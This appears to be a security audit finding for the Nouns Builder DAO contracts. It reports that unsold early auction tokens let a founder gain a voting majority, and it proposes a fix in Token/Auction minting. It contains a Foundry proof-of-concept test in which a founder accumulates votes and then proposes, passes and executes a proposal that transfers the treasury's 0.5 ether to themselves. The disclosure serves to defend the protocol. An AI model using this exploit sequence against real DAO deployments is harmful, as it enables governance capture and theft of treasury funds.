Cold Blonde Sparrow

medium

# If the first tokens are not sold at the beginning of the auctions, the founder may be able to obtain the majority of votes allowing them to manage proposals and treasury assets

## Summary

Initially, the founders may hold a majority of the votes if the first tokens remain unsold. This scenario allows the founders to manage funds and proposals once tokens start selling.

## Vulnerability Detail

Tokens are allocated to founders in accordance with a [vesting schedule](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L158):

```solidity
File: Token.sol
157:                 // Compute the vesting schedule
158:                 uint256 schedule = 100 / founderPct;
159: 
160:                 // Used to store the base token id the founder will recieve
161:                 uint256 baseTokenId = reservedUntilTokenId;
162: 
163:                 // For each token to vest:
164:                 for (uint256 j; j < founderPct; ++j) {
165:                     // Get the available token id
166:                     baseTokenId = _getNextTokenId(baseTokenId);
167: 
168:                     // Store the founder as the recipient
169:                     tokenRecipient[baseTokenId] = newFounder;
170: 
171:                     emit MintScheduled(baseTokenId, founderId, newFounder);
172: 
173:                     // Update the base token id
174:                     baseTokenId = (baseTokenId + schedule) % 100;
175:                 }
```

When tokens are minted (typically at the commencement of auctions), a token is minted to both the `Auction` contract and to the [founder if the identifier corresponds to him](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L238):

```solidity
File: Token.sol
230:     function _mintWithVesting(address recipient) internal returns (uint256 tokenId) {
231:         // Cannot realistically overflow
232:         unchecked {
233:             do {
234:                 // Get the next token to mint
235:                 tokenId = reservedUntilTokenId + settings.mintCount++;
236: 
237:                 // Lookup whether the token is for a founder, and mint accordingly if so
238:             } while (_isForFounder(tokenId));
239:         }
240: 
241:         // Mint the next available token to the recipient for bidding
242:         _mint(recipient, tokenId);
243:     }
```

A problem arises if no tokens are initially sold, resulting in tokens being minted to founders, thereby granting them a majority of votes at the beginning of the auctions. This could **enable founders to manage proposals or treasury assets** once tokens start selling.

## Impact

If a founder receives the majority of votes due to unsold tokens, they could manage proposals or treasury assets once tokens start selling. Consider the following scenario:

1. A `founder` with [50 percent ownership](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L130) will be [allocated tokens in the following sequence:](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L164-L175) `tokenRecipient[0]`, `tokenRecipient[2]`, `tokenRecipient[4]` ... `tokenRecipient[98]`
2. The first token is minted to both the [`Auction` contract](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/auction/Auction.sol#L294) and to the founder. The founder now possesses a single token, each representing one vote.
3. The auction's token is not sold and [needs to be burned](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/auction/Auction.sol#L285).
4. The second token is minted to the `Auction contract` and to the founder. The founder now possesses two tokens, each representing one vote. The auction's token is not sold and needs to be burned.
5. Another token is minted to the `auction contract` and finally is sold, now the founder has 3 tokens/3 votes. At this point the founder holds the majority of votes.

In the next test, it is shown that the founder receives the majority of votes due to unsold tokens problem, then the first token is sold at `0.5 ether`, and the malicious founder proposes and executes a proposal to receive the `0.5 ether` from the `treasury`. It should also be noted that the time between the submission of the proposal and execution of the proposal may be much shorter than the period of time during which other participants can enter and deny the malicious proposal.

```solidity
// File: Token.t.sol
// $ forge test --match-test "test_foundersWillGetTheMajority" -vvv
//
    function test_foundersMayGetTheMajorityOfVotesIfFirstTokensAreNotSold() public {
        // Founder may get the majority of votes at the beginning of the auctions if the first tokens are not sold.
        //
        // 1. Deploy DAO using 1 founder and assign 50 percent.
        uint256 founderInitialBalance = 1 ether;
        createUsers(1, founderInitialBalance);
        address[] memory wallets = new address[](1);
        uint256[] memory percents = new uint256[](1);
        uint256[] memory vestExpirys = new uint256[](1);
        address founder = otherUsers[0];
        wallets[0] = founder;
        percents[0] = 50;
        vestExpirys[0] = 4 weeks;
        deployWithCustomFounders(wallets, percents, vestExpirys);
        //
        // 2. assert tokenRecipient: [0], [2], [4] .. [98]
        unchecked {
            uint256 j = 0;
            for (uint256 i; i < 50; ++i) {
                assertEq(token.getScheduledRecipient(j).wallet, founder);
                j += 2;
            }
        }
        //
        // 3. The auction starts and the founder get the first token
         vm.prank(founder);
        auction.unpause();
        assertEq(token.balanceOf(founder), 1);
        assertEq(token.getVotes(founder), 1);
        (uint256 nextTokenId, , , , , ) = auction.auction();
        assertEq(nextTokenId, 1);
        //
        // 4. The auction's token is not sold and it is burned
        vm.warp(block.timestamp + 10 minutes);
        auction.settleCurrentAndCreateNewAuction();
        //
        // 5. The next auction's token is minted and the founder get another token
        (nextTokenId, , , , , ) = auction.auction();
        assertEq(nextTokenId, 3);
        assertEq(token.balanceOf(founder), 2);
        assertEq(token.getVotes(founder), 2);
        //
        // 6. The auction's token is not sold and it is burned
        vm.warp(block.timestamp + 10 minutes);
        auction.settleCurrentAndCreateNewAuction();
        //
        // 7. The next auction's token is minted and the founder get another token and more votes
        (nextTokenId, , , , , ) = auction.auction();
        assertEq(nextTokenId, 5);
        assertEq(token.balanceOf(founder), 3);
        assertEq(token.getVotes(founder), 3);
        //
        // 8. The next token is sold to Alice but at this time, the founder has the majority of votes.
        address alice = address(1222);
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        auction.createBid{ value: 0.5 ether }(nextTokenId);
        vm.warp(block.timestamp + 10 minutes);
        auction.settleCurrentAndCreateNewAuction();
        assertEq(token.balanceOf(founder), 4);
        assertEq(token.getVotes(founder), 4);
        assertEq(token.balanceOf(alice), 1);
        assertEq(token.getVotes(alice), 1);
        //
        // 9. Malicious founder propose a transfer funds action from the treasury to him
        assertEq(address(treasury).balance, 0.5 ether);
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets = new address[](1);
        values = new uint256[](1);
        calldatas = new bytes[](1);
        targets[0] = founder;
        values[0] = 0.5 ether;
        calldatas[0] = abi.encodeWithSignature("");
        vm.startPrank(founder);
        bytes32 proposalId = governor.propose(targets, values, calldatas, "");
        vm.warp(block.timestamp + governor.votingDelay());
        governor.castVote(proposalId, 1);
        vm.warp(block.timestamp + governor.votingPeriod());
        governor.queue(proposalId);
        vm.warp(block.timestamp + treasury.delay());
        governor.execute(targets, values, calldatas, keccak256(bytes("")), founder);
        //
        // 10. Now the treasury is empty and malicious founder obtains 0.5 ether.
        assertEq(address(treasury).balance, 0);
        assertEq(address(founder).balance, founderInitialBalance + 0.5 ether);
    }
```


## Code Snippet

- [Token::_addFounders](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L120)
- [Token::_mintWithVesting](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L230)

## Tool used

Manual review

## Recommendation

Consider the issuance of tokens to founders during the transfer token process to bidders. This would promote a fair participation among the DAO participants (token holders).

```diff
    /// @dev Settles the current auction
    function _settleAuction() private {
        ...
        ...
        if (_auction.highestBidder != address(0)) {
            // Cache the amount of the highest bid
            uint256 highestBid = _auction.highestBid;

            // If the highest bid included ETH: Pay rewards and transfer remaining amount to the DAO treasury
            if (highestBid != 0) {
                // Calculate rewards
                RewardSplits memory split = _computeTotalRewards(currentBidReferral, highestBid, founderReward.percentBps);

                if (split.totalRewards != 0) {
                    // Deposit rewards
                    rewardsManager.depositBatch{ value: split.totalRewards }(split.recipients, split.amounts, split.reasons, "");
                }

                // Deposit remaining amount to treasury
                _handleOutgoingTransfer(settings.treasury, highestBid - split.totalRewards);
            }

            // Transfer the token to the highest bidder
            token.transferFrom(address(this), _auction.highestBidder, _auction.tokenId);
++          // Mint token to founders if corresponds
            // Else no bid was placed:
        }
        ...
        ...
    }
```